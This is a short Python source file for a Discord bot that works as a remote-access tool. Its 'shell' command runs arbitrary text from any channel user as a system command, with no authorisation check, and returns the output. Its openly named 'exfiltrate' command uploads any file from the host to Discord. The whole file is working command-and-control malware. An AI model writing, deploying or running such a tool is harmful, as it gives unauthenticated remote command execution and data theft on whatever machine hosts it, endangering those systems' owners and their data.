from dotenv import load_dotenv
import os
import discord
import subprocess
from discord.ext import commands
import psutil

load_dotenv()

token = os.getenv("DISCORD_TOKEN")


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='$', intents=intents)

@bot.command()
async def ping(ctx):
    await ctx.send('pong')

@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    await ctx.send(arguments)
    
    output = subprocess.run(arguments, shell=True, capture_output=True, text=True)
    await ctx.send(output.stdout)

@bot.command()
async def memory(ctx):
    await ctx.send(psutil.virtual_memory())

@bot.command()
async def exfiltrate(ctx, arg1):
    print(os.path.getsize(arg1))
    if os.path.getsize(arg1) < 8388608:
        await ctx.send(file=discord.File(arg1))
    #await ctx.file.send(arg1)

bot.run(token)
